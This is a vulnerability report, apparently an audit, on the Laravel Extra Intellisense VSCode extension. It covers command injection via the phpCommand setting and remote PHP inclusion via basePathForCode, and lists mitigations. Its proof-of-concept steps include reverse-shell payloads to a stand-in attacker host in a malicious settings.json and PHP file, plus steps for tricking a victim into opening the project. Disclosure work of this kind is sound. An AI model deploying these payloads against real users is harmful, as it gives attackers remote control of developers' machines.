## Vulnerability List for Laravel Extra Intellisense Extension

* Vulnerability Name: **Command Injection via `phpCommand` configuration**
    * Description:
        The `LaravelExtraIntellisense.phpCommand` setting in the extension's configuration allows users to specify the command used to execute PHP code. This command is used by the extension to run Laravel commands in order to gather autocompletion data. If a user is tricked into opening a workspace containing a malicious `.vscode/settings.json` file that modifies this setting to include shell command injection payloads, an attacker can achieve Remote Code Execution (RCE) on the victim's machine when the extension attempts to use this command.

        Steps to trigger the vulnerability:
        1. An attacker creates a malicious Laravel project with a `.vscode/settings.json` file.
        2. In the `.vscode/settings.json`, the attacker sets the `LaravelExtraIntellisense.phpCommand` configuration to a malicious command, for example: `"LaravelExtraIntellisense.phpCommand": "bash -c '{code}; bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"` (where `ATTACKER_IP` and `ATTACKER_PORT` are controlled by the attacker).
        3. The attacker convinces a victim to clone and open this malicious Laravel project in VSCode with the Laravel Extra Intellisense extension installed.
        4. When the extension activates and attempts to run any Laravel command (e.g., to fetch routes, views, configs, etc.), it will use the malicious `phpCommand`.
        5. The injected command within `phpCommand` will be executed by the system shell, in addition to the intended PHP code represented by `{code}`. In the example above, this will establish a reverse shell connection to the attacker's machine.

    * Impact:
        Remote Code Execution (RCE). An attacker can gain full control over the victim's machine, potentially leading to data theft, malware installation, or further attacks.

    * Vulnerability Rank: critical

    * Currently implemented mitigations:
        None. The extension directly uses the configured `phpCommand` without any sanitization or validation.

    * Missing mitigations:
        - Input sanitization and validation for the `LaravelExtraIntellisense.phpCommand` setting. The extension should validate or sanitize the user-provided command to prevent injection of arbitrary shell commands.
        - Warn users about the security risks of modifying extension settings, especially when opening workspaces from untrusted sources.
        - Consider restricting the characters or commands allowed in `phpCommand` to a safe subset.
        - Explore alternative safer methods to execute PHP code, potentially within a sandboxed environment, or using safer APIs if available.

    * Preconditions:
        - Victim has the Laravel Extra Intellisense extension installed in VSCode.
        - Victim opens a workspace in VSCode that contains a malicious `.vscode/settings.json` file.
        - The malicious `.vscode/settings.json` file configures `LaravelExtraIntellisense.phpCommand` with a command injection payload.

    * Source code analysis:

        1.  **`src/helpers.ts`**: The `runPhp` function constructs the command to execute PHP code by directly embedding the `code` parameter into the `phpCommand` setting.

        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\""); // basic escaping for double quotes
            // ... platform specific escaping ...
            let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
            let command = commandTemplate.replace("{code}", code); // vulnerable line, direct substitution
            // ... execution using cp.exec(command, ...)
        }
        ```

        2.  The `phpCommand` configuration is retrieved directly from VSCode settings without any validation.

        ```typescript
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
        ```

        3.  The `{code}` placeholder is replaced by the `$code` argument, which is intended to be the PHP code generated by the extension, but can be influenced by a malicious `phpCommand` setting to execute arbitrary shell commands.

    * Security test case:

        1.  **Attacker setup:**
            - Set up a listener on attacker machine to receive reverse shell, e.g., `nc -lvnp 4444`.
            - Create a malicious Laravel project directory.
            - Inside the project directory, create `.vscode` folder.
            - Inside `.vscode` folder, create `settings.json` file with the following content:
            ```json
            {
                "LaravelExtraIntellisense.phpCommand": "bash -c '{code}; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
            }
            ```
            Replace `ATTACKER_IP` with the IP address of the attacker machine.
            - Zip the malicious project directory.
            - Send the zipped malicious project to the victim or host it on a public repository and trick the victim to clone it.

        2.  **Victim actions:**
            - Install Laravel Extra Intellisense extension in VSCode.
            - Download and extract the malicious project zip file.
            - Open the extracted project directory in VSCode.
            - Open any PHP or Blade file within the project. This should trigger the extension to run a Laravel command and thus execute the malicious `phpCommand`.

        3.  **Verification:**
            - On the attacker machine, the `netcat` listener should receive a connection, indicating successful command injection and reverse shell execution on the victim's machine.

* Vulnerability Name: **Code Injection via Workspace Configuration Files**
    * Description:
        The extension relies on user-defined workspace configuration files, specifically `.vscode/settings.json`, to customize its behavior. The `LaravelExtraIntellisense.basePathForCode` setting controls the base paths used by the extension. These paths are used in `require_once` and `chdir` operations within the PHP code executed by the extension. By manipulating these settings, an attacker can potentially inject and execute arbitrary PHP code when the extension runs Laravel commands.

        Steps to trigger the vulnerability:
        1.  An attacker crafts a malicious Laravel project with a `.vscode/settings.json` file.
        2.  In the `.vscode/settings.json`, the attacker sets the `LaravelExtraIntellisense.basePathForCode` setting to a path that includes a malicious PHP file under their control. For example, the attacker could set it to a public web server URL that serves a PHP file with malicious code.
        3.  When the extension executes PHP code using `Helpers.runLaravel`, the malicious `basePathForCode` is used in `require_once`.
        4.  If the attacker carefully crafts the injected path, they can trick `require_once` to include a malicious PHP file from the attacker-controlled location, which will then be executed in the context of the Laravel application execution within the extension.

    * Impact:
        Code Injection, potentially leading to Remote Code Execution (RCE). An attacker can inject and execute arbitrary PHP code within the context of the Laravel application, potentially leading to data theft, malware installation, or further attacks.

    * Vulnerability Rank: high

    * Currently implemented mitigations:
        None. The extension directly uses the configured `basePathForCode` without any sanitization or validation when constructing paths for `require_once`.

    * Missing mitigations:
        - Input sanitization and validation for `LaravelExtraIntellisense.basePath` and `LaravelExtraIntellisense.basePathForCode` settings. The extension should validate these paths to ensure they are within the workspace directory and do not point to external or attacker-controlled locations.
        - Implement path canonicalization to resolve symbolic links and prevent path traversal attacks.
        - Avoid using `require_once` with user-controlled paths. If `require_once` is necessary, ensure the path is strictly validated and canonicalized.
        - Consider using safer alternatives to `require_once` if feasible, or restrict file inclusion to a whitelist of known safe files.

    * Preconditions:
        - Victim has the Laravel Extra Intellisense extension installed in VSCode.
        - Victim opens a workspace in VSCode that contains a malicious `.vscode/settings.json` file.
        - The malicious `.vscode/settings.json` file configures `LaravelExtraIntellisense.basePathForCode` to a path pointing to a malicious PHP file.

    * Source code analysis:

        1.  **`src/helpers.ts`**: The `projectPath` function retrieves `basePathForCode` from settings and constructs file paths using it for code execution context.

        ```typescript
        static projectPath(path:string, forCode: boolean = false) : string {
            // ...
            let basePathForCode = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePathForCode');
            if (forCode && basePathForCode && basePathForCode.length > 0) {
                if (basePathForCode.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
                    basePathForCode = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePathForCode);
                }
                basePathForCode = basePathForCode.replace(/[\/\\]$/, "");
                return basePathForCode + path; // vulnerable path construction
            }
            // ...
        }
        ```

        2.  **`src/EloquentProvider.ts`, `src/ConfigProvider.ts`, `src/RouteProvider.ts`, `src/TranslationProvider.ts`, `src/ViewProvider.ts`, `src/BladeProvider.ts`, `src/AuthProvider.ts`, `src/AssetProvider.ts`, `src/MixProvider.ts`, `src/ViteProvider.ts`, `src/EnvProvider.ts`, `src/MiddlewareProvider.ts`, `src/ValidationProvider.ts`**: These provider files use `Helpers.runLaravel` which in turn uses `Helpers.projectPath(..., true)` when constructing the PHP code to execute. This makes them all potentially vulnerable if `basePathForCode` is maliciously configured. For example in `EloquentProvider.ts`:

        ```typescript
        Helpers.runLaravel(
            "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
            "   if (is_dir(base_path($modelPath))) {" +
            "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
            "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
            "             include_once base_path(\"$modelPath/$sourceFile\");" + // require_once using base_path
            "         }" +
            "      }" +
            "   }" +
            "}" +
            // ... rest of the PHP code
            , "Eloquent Attributes and Relations"
        )
        ```
        Here `base_path()` within the PHP code is affected by `basePathForCode` configuration through the `Helpers.projectPath(..., true)` usage in `Helpers.runLaravel`.

    * Security test case:

        1.  **Attacker setup:**
            - Create a malicious Laravel project directory.
            - Inside the project directory, create `.vscode` folder.
            - Inside `.vscode` folder, create `settings.json` file with the following content. Assuming attacker controls `http://attacker.example.com/malicious.php` which contains PHP code to execute a reverse shell:
            ```json
            {
                "LaravelExtraIntellisense.basePathForCode": "http://attacker.example.com"
            }
            ```
            - Create `malicious.php` on `http://attacker.example.com` with php reverse shell code, e.g., `<?php system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"'); ?>`

        2.  **Victim actions:**
            - Install Laravel Extra Intellisense extension in VSCode.
            - Download and extract the malicious project zip file.
            - Open the extracted project directory in VSCode.
            - Open any PHP or Blade file within the project, triggering the extension to execute Laravel commands.

        3.  **Verification:**
            - On the attacker machine, the `netcat` listener should receive a connection, confirming code injection from the malicious PHP file and RCE.
